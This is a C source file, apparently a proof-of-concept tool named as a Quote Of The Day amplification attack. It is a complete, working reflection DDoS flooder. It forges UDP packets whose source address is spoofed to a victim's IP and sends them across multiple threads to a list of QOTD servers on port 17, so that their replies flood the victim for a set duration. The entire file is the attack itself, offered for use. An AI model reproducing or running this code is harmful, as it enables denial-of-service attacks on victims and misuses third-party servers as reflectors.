/*-------------------------------
Quote Of The Day amplification PoC on the dumb template C script.
- Phenomite
-------------------------------*/
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

static unsigned int DPORT = 17;
static const char PAYLOAD[] = "\x0d";

// Phenomite template begin
#define MAX_PACKET_SIZE 4096
#define PHI 0xaaf219b9
static uint32_t Q[4096], c = 362436;
static unsigned int PAYLOADSIZE = sizeof(PAYLOAD) - 1;

struct list {
  struct sockaddr_in data;
  struct list *next;
  struct list *prev;
};
struct list *head;
volatile int tehport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data {
  int thread_id;
  struct list *list_node;
  struct sockaddr_in sin;
};

void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) {
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
  }
}

uint32_t rand_cmwc(void) {
  uint64_t t, a = 18782LL;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}

/* function for header checksums */
unsigned short csum(unsigned short *buf, int nwords) {
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph) {
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOADSIZE;
  iph->id = htonl(61337);
  iph->frag_off = 0;
  iph->ttl = MAXTTL;
  iph->protocol = IPPROTO_UDP;
  iph->check = 0;
  iph->saddr = inet_addr("127.0.0.1");
}
void setup_udp_header(struct udphdr *udph) {
  udph->source = htons(61337);
  udph->dest = htons(DPORT);
  udph->check = 0;
  memcpy((void *)udph + sizeof(struct udphdr), PAYLOAD, PAYLOADSIZE);
  udph->len = htons(sizeof(struct udphdr) + PAYLOADSIZE);
}
void *flood(void *par1) {
  struct thread_data *td = (struct thread_data *)par1;
  char datagram[MAX_PACKET_SIZE];
  struct iphdr *iph = (struct iphdr *)datagram;
  struct udphdr *udph = (/*u_int8_t*/ void *)iph + sizeof(struct iphdr);
  struct sockaddr_in sin = td->sin;
  struct list *list_node = td->list_node;
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  if (s < 0) {
    fprintf(stderr, "Could not open raw socket.\n");
    exit(-1);
  }
  init_rand(time(NULL));
  memset(datagram, 0, MAX_PACKET_SIZE);
  setup_ip_header(iph);
  setup_udp_header(udph);
  udph->source = htons(tehport);
  iph->saddr = sin.sin_addr.s_addr;
  iph->daddr = list_node->data.sin_addr.s_addr;
  iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
  int tmp = 1;
  const int *val = &tmp;
  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
    exit(-1);
  }
  init_rand(time(NULL));
  register unsigned int i;
  i = 0;
  while (1) {
    list_node = list_node->next;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data,
           sizeof(list_node->data));
    pps++;
    if (i >= limiter) {
      i = 0;
      usleep(sleeptime);
    }
    i++;
  }
}
int main(int argc, char *argv[]) {
  if (argc < 6) {
    fprintf(stdout, "%s host port listfile threads limit[-1 for none] time\n",
            argv[0]);
    exit(-1);
  }
  srand(time(NULL));
  int i = 0;
  head = NULL;
  fprintf(stdout, "Loading list to buffer\n");
  int max_len = 512;
  char *buffer = (char *)malloc(max_len);
  buffer = memset(buffer, 0x00, max_len);
  tehport = atoi(argv[2]);
  int num_threads = atoi(argv[4]);
  int maxpps = atoi(argv[5]);
  limiter = 0;
  pps = 0;
  int multiplier = 20;
  FILE *list_fd = fopen(argv[3], "r");
  while (fgets(buffer, max_len, list_fd) != NULL) {
    if ((buffer[strlen(buffer) - 1] == '\n') ||
        (buffer[strlen(buffer) - 1] == '\r')) {
      buffer[strlen(buffer) - 1] = 0x00;
      if (head == NULL) {
        head = (struct list *)malloc(sizeof(struct list));
        bzero(&head->data, sizeof(head->data));
        head->data.sin_addr.s_addr = inet_addr(buffer);
        head->next = head;
        head->prev = head;
      } else {
        struct list *new_node = (struct list *)malloc(sizeof(struct list));
        memset(new_node, 0x00, sizeof(struct list));
        new_node->data.sin_addr.s_addr = inet_addr(buffer);
        new_node->prev = head;
        new_node->next = head->next;
        head->next = new_node;
      }
      i++;
    } else {
      continue;
    }
  }
  struct list *current = head->next;
  pthread_t thread[num_threads];
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(argv[1]);
  struct thread_data td[num_threads];
  for (i = 0; i < num_threads; i++) {
    td[i].thread_id = i;
    td[i].sin = sin;
    td[i].list_node = current;
    pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
  }
  fprintf(stdout, "Yeeting\n");
  for (i = 0; i < (atoi(argv[6]) * multiplier); i++) {
    usleep((1000 / multiplier) * 1000);
    if ((pps * multiplier) > maxpps) {
      if (1 > limiter) {
        sleeptime += 100;
      } else {
        limiter--;
      }
    } else {
      limiter++;
      if (sleeptime > 25) {
        sleeptime -= 25;
      } else {
        sleeptime = 0;
      }
    }
    pps = 0;
  }
  return 0;
}
